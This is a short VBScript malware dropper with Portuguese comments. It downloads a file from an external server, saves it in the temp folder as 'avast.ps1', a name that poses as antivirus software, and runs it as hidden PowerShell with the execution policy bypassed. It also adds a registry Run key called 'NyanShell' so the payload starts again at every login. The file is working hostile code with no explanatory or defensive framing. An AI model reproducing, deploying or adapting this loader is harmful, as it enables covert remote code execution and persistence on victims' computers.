Dim xHttp, bStrm, scriptShell

Set xHttp = CreateObject("Microsoft.XMLHTTP")
Set bStrm = CreateObject("Adodb.Stream")

' Baixa o arquivo do servidor
xHttp.Open "GET", "https://privacy-58248-com.vercel.app/lo.txt", False
xHttp.Send

' Caminho onde o script PowerShell será salvo temporariamente
scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\avast.ps1"

With bStrm
    .Type = 1 ' Tipo binário
    .Open
    .Write xHttp.responseBody
    .SaveToFile scriptShell, 2 ' 2 = sobrescrever
End With

WScript.Sleep 1000

ExecuteAndInstall scriptShell

Function ExecuteAndInstall(path)
    Dim objShell, WshShell

    Set objShell = CreateObject("WScript.Shell")
    ' Executa o script PowerShell oculto, sem abrir janela e sem esperar
    objShell.Run "powershell -executionpolicy bypass -noprofile -windowstyle hidden -file """ & path & """", 0, False

    Set WshShell = CreateObject("WScript.Shell")
    ' Cria persistência no registro para rodar no login
    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NyanShell", _
        "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -file """ & path & """", "REG_SZ"
End Function
